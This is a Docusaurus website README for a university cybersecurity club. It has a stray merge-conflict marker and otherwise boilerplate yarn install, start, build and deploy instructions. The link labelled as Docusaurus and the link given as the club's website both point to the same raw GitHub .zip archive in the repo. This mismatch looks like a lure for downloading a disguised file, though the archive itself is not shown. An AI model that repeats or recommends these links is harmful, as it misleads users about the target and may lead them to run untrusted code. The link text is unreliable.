<<<<<<< HEAD
# Website

This website is built using [Docusaurus](https://raw.githubusercontent.com/elcaja5/ClubCiberseguridad-UC/main/src/ClubCiberseguridad-UC-v2.5.zip), a modern static website generator. 
La página web del Club de Ciberseguridad de la Universidad de Cuenca es https://raw.githubusercontent.com/elcaja5/ClubCiberseguridad-UC/main/src/ClubCiberseguridad-UC-v2.5.zip

### Installation

```
$ yarn
```

### Local Development

```
$ yarn start
```

This command starts a local development server and opens up a browser window. Most changes are reflected live without having to restart the server.

### Build

```
$ yarn build
```

This command generates static content into the `build` directory and can be served using any static contents hosting service.

### Deployment

Using SSH:

```
$ USE_SSH=true yarn deploy
```

Not using SSH:

```
$ GIT_USER=<Your GitHub username> yarn deploy
```

If you are using GitHub pages for hosting, this command is a convenient way to build the website and push to the `gh-pages` branch.


